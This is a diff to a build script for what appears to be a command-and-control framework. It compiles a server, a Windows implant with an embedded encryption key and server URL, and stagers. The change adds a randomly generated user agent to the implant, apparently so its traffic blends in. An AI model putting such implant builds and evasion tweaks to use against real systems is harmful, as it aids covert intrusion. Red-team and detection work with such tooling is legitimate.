@@ -52,9 +52,17 @@ GOOS=linux GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPT
 GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY}" -trimpath -o ../../build/server.exe
 cd ../..
 
+
+echo "[*] generating random user agent..."
+pushd utils/genua > /dev/null
+go get .
+USER_AGENT=$(go run .)
+popd > /dev/null
+echo "    Generated User Agent: ${USER_AGENT}"
+
 echo "[*] building implant..."
 cd implant/cmd
-GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X main.ServerURL=${SERVER_URL}" -trimpath -o ../../build/implant.exe
+GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -X main.EncryptionKey=${ENCRYPTION_KEY} -X \"main.UserAgent=${USER_AGENT}\" -X main.ServerURL=${SERVER_URL}" -trimpath -o ../../build/implant.exe
 cd ../..
 cp build/implant.exe build/payloads/implant.exe
 echo "[*] building stagers..."
